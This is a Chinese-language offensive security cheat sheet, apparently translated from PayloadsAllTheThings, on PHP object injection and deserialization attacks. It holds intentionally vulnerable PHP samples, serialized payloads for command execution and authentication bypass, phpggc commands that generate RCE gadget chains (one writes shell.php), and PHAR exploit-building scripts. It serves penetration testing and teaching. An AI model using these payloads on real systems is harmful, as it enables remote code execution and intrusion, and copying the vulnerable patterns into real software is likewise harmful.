# PHP 反序列化

> PHP 对象注入是一种应用程序级别的漏洞，攻击者可能利用此漏洞执行各种恶意攻击，例如代码注入、SQL 注入、路径遍历和应用程序拒绝服务等，具体取决于上下文。该漏洞发生在用户提供的输入在传递给 PHP 函数 `unserialize()` 之前没有被正确清理的情况下。由于 PHP 支持对象序列化，攻击者可以传递自定义的序列化字符串到易受攻击的 `unserialize()` 调用中，从而将任意 PHP 对象注入到应用程序范围内。

## 概述

* [通用概念](#通用概念)
* [认证绕过](#认证绕过)
* [对象注入](#对象注入)
* [查找和使用小工具](#查找和使用小工具)
* [Phar 反序列化](#phar反序列化)
* [真实世界示例](#真实世界示例)
* [参考文献](#参考文献)

## 通用概念

以下魔术方法可以帮助你进行 PHP 对象注入：

* `__wakeup()` 当对象被反序列化时。
* `__destruct()` 当对象被删除时。
* `__toString()` 当对象被转换为字符串时。

你也应该检查 [文件包含](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phar) 中的 `Wrapper Phar://`，它使用了 PHP 对象注入。

易受攻击的代码：

```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        if(is_array($var1)){
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }
    else{
        echo ""; # 没有发生任何事情
    }
?>
```

利用应用程序内部已有的代码创建有效载荷。

* 基本序列化数据

    ```php
    a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
    ```

* 命令执行

    ```php
    string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
    ```

## 认证绕过

### 类型转换

易受攻击的代码：

```php
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}
```

有效载荷：

```php
a:2:{s:8:"username";b:1;s:8:"password";b:1;}
```

因为 `true == "str"` 是真的。

## 对象注入

易受攻击的代码：

```php
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
```

有效载荷：

```php
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}
```

我们可以这样做：

```php
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}
```

## 查找和使用小工具

也称为 `"PHP POP 链"`, 它们可以用来在系统上获得 RCE（远程代码执行）。

* 在 PHP 源代码中，寻找 `unserialize()` 函数。
* 有趣的 [魔术方法](https://www.php.net/manual/en/language.oop5.magic.php) 如 `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, 和 `__debugInfo()`:
    * `__construct()`: PHP 允许开发人员为类声明构造函数方法。具有构造函数方法的类会在每个新创建的对象上调用此方法，因此它适合于对象需要使用的任何初始化。[php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.construct)
    * `__destruct()`: 当不再有对特定对象的其他引用时，或者在关闭序列中的任何顺序下，将调用析构函数方法。[php.net](https://www.php.net/manual/en/language.oop5.decon.php#object.destruct)
    * `__call(string $name, array $arguments)`: `$name` 参数是被调用的方法名称。`$arguments` 参数是一个包含传递给 `$name` 方法的参数的枚举数组。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.call)
    * `__callStatic(string $name, array $arguments)`: `$name` 参数是被调用的方法名称。`$arguments` 参数是一个包含传递给 `$name` 方法的参数的枚举数组。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.callstatic)
    * `__get(string $name)`: `__get()` 用于读取不可访问（受保护或私有的）或不存在的属性的数据。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.get)
    * `__set(string $name, mixed $value)`: `__set()` 在写入不可访问（受保护或私有的）或不存在的属性的数据时运行。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.set)
    * `__isset(string $name)`: `__isset()` 在对不可访问（受保护或私有的）或不存在的属性调用 `isset()` 或 `empty()` 时触发。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.isset)
    * `__unset(string $name)`: 当对不可访问（受保护或私有的）或不存在的属性使用 `unset()` 时，将调用 `__unset()`。[php.net](https://www.php.net/manual/en/language.oop5.overloading.php#object.unset)
    * `__sleep()`: `serialize()` 检查类是否有一个名为 `__sleep()` 的魔术方法。如果是，则在任何序列化之前执行该方法。它可以清理对象，并应返回一个包含应序列化的该对象的所有变量名称的数组。如果该方法不返回任何内容，则序列化为 `null` 并发出 `E_NOTICE`。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.sleep)
    * `__wakeup()`: `unserialize()` 检查是否存在名为 `__wakeup()` 的魔术方法。如果存在，此方法可以重建对象可能丢失的任何资源。`__wakeup()` 的预期用途是在序列化过程中可能丢失的数据库连接重新建立并执行其他重新初始化任务。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.wakeup)
    * `__serialize()`: `serialize()` 检查类是否有一个名为 `__serialize()` 的魔术方法。如果是，则在任何序列化之前执行该方法。它必须构建并返回一个表示对象序列形式的键值对关联数组。如果没有返回数组，则会抛出 `TypeError`。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.serialize)
    * `__unserialize(array $data)`: 该函数将接收从 `__serialize()` 返回的恢复数组。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize)
    * `__toString()`: `__toString()` 方法允许类决定在将其视为字符串时如何反应。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring)
    * `__invoke()`: `__invoke()` 方法在脚本尝试将对象作为函数调用时被调用。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.invoke)
    * `__set_state(array $properties)`: 此静态方法在由 `var_export()` 导出的类上调用。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.set-state)
    * `__clone()`: 一旦克隆完成，如果定义了 `__clone()` 方法，则将调用新创建对象的 `__clone()` 方法，以允许更改任何必要的属性。[php.net](https://www.php.net/manual/en/language.oop5.cloning.php#object.clone)
    * `__debugInfo()`: 当使用 `var_dump()` 转储对象时，此方法被调用来获取应显示的属性。如果未在对象上定义该方法，则将显示所有公共、受保护和私有属性。[php.net](https://www.php.net/manual/en/language.oop5.magic.php#object.debuginfo)

[ambionics/phpggc](https://github.com/ambionics/phpggc) 是一个基于多个框架生成有效载荷的工具：

* Laravel
* Symfony
* SwiftMailer
* Monolog
* SlimPHP
* Doctrine
* Guzzle

```powershell
phpggc monolog/rce1 'phpinfo();' -s
phpggc monolog/rce1 assert 'phpinfo()'
phpggc swiftmailer/fw1 /var/www/html/shell.php /tmp/data
phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/testinfo.ini
```

## Phar 反序列化

使用 `phar://` 封装器，可以在指定文件上触发反序列化，如 `file_get_contents("phar://./archives/app.phar")`。

有效的 PHAR 包括四个元素：

1. **存根**: 存根是一段 PHP 代码，在文件以可执行上下文访问时执行。存根的最低要求是在其末尾包含 `__HALT_COMPILER();`。否则，存根的内容没有任何限制。
2. **清单**: 包含有关存档及其内容的元数据。
3. **文件内容**: 包含存档中的实际文件。
4. **签名**(可选): 用于验证存档的完整性。

* 示例：为了利用自定义的 `PDFGenerator` 创建一个 PHAR。

    ```php
    <?php
    class PDFGenerator { }

    // 创建一个新的 Dummy 类实例并修改其属性
    $dummy = new PDFGenerator();
    $dummy->callback = "passthru";
    $dummy->fileName = "uname -a > pwned"; // 我们的有效载荷

    // 删除任何同名的现有 PHAR 存档
    @unlink("poc.phar");

    // 创建一个新的存档
    $poc = new Phar("poc.phar");

    // 将所有写操作添加到缓冲区，而不会修改磁盘上的存档
    $poc->startBuffering();

    // 设置存根
    $poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

    /* 在存档中添加一个新文件，内容为 "text" */
    $poc["file"] = "text";
    // 将 Dummy 对象添加到元数据中。这将被序列化
    $poc->setMetadata($dummy);
    // 停止缓冲并将更改写入磁盘
    $poc->stopBuffering();
    ?>
    ```

* 示例：创建一个带有 `JPEG` 魔术字节头的 PHAR，因为存根的内容没有限制。

    ```php
    <?php
    class AnyClass {
        public $data = null;
        public function __construct($data) {
            $this->data = $data;
        }
        
        function __destruct() {
            system($this->data);
        }
    }

    // 创建新的 PHAR
    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt', 'text');
    $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

    // 将任何类的对象作为元数据添加
    $object = new AnyClass('whoami');
    $phar->setMetadata($object);
    $phar->stopBuffering();
    ```

## 真实世界示例

* [Vanilla 论坛 ImportController index 文件存在 Unserialize 远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/410237)
* [Vanilla 论坛 Xenforo 密码 splitHash Unserialize 远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/410212)
* [Vanilla 论坛 domGetImages getimagesize Unserialize 远程代码执行漏洞（严重）- Steven Seeley](https://hackerone.com/reports/410882)
* [Vanilla 论坛 Gdn_Format unserialize() 远程代码执行漏洞 - Steven Seeley](https://hackerone.com/reports/407552)

## 参考文献

* [CTF 写作：Kaspersky CTF 中的 PHP 对象注入 - Jaimin Gohel - 2018年11月24日](https://medium.com/@jaimin_gohel/ctf-writeup-php-object-injection-in-kaspersky-ctf-28a68805610d)
* [ECSC 2019 资格赛法国团队 - Jack The Ripper Web - noraj - 2019年5月22日](https://web.archive.org/web/20211022161400/https://blog.raw.pm/en/ecsc-2019-quals-write-ups/#164-Jack-The-Ripper-Web)
* [在常见 Symfony Bundle 上找到 POP 链：第一部分 - Rémi Matasse - 2023年9月12日](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1)
* [在常见 Symfony Bundle 上找到 POP 链：第二部分 - Rémi Matasse - 2023年10月11日](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2)
* [查找 PHP 序列化小工具链 - DG'hAck Unserial killer - xanhacks - 2022年8月11日](https://www.xanhacks.xyz/p/php-gadget-chain/#introduction)
* [如何利用 PHAR 反序列化漏洞 - Alexandru Postolache - 2020年5月29日](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/)
* [phar:// 反序列化 - HackTricks - 2024年7月19日](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization)
* [PHP 反序列化攻击和 Laravel 中的新小工具链 - Mathieu Farrell - 2024年2月13日](https://blog.quarkslab.com/php-deserialization-attacks-and-a-new-gadget-chain-in-laravel.html)
* [PHP 通用小工具 - Charles Fol - 2017年7月4日](https://www.ambionics.io/blog/php-generic-gadget-chains)
* [PHP 内部书籍 - 序列化 - jpauli - 2013年6月15日](http://www.phpinternalsbook.com/classes_objects/serialization.html)
* [PHP 对象注入 - Egidio Romano - 2020年4月24日](https://www.owasp.org/index.php/PHP_Object_Injection)
* [PHP Pop 链 - 实现 RCE 的 Pop 链漏洞 - Vickie Li - 2020年9月3日](https://vkili.github.io/blog/insecure%20deserialization/pop-chains/)
* [PHP 反序列化 - php.net - 2001年3月29日](http://php.net/manual/en/function.unserialize.php)
* [POC2009 PHP 利用中的惊人新闻 - Stefan Esser - 2015年5月23日](https://web.archive.org/web/20150523205411/https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
* [锈蚀的 Joomla RCE 反序列化溢出 - Alessandro Groppo - 2019年10月3日](https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/)
* [TSULOTT Web 挑战写作 - MeePwn CTF - Rawsec - 2017年7月15日](https://web.archive.org/web/20211022151328/https://blog.raw.pm/en/meepwn-2017-write-ups/#TSULOTT-Web)
* [在 PHP 中利用代码重用/ROP - Stefan Esser - 2020年6月15日](http://web.archive.org/web/20200615044621/https://owasp.org/www-pdf-archive/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)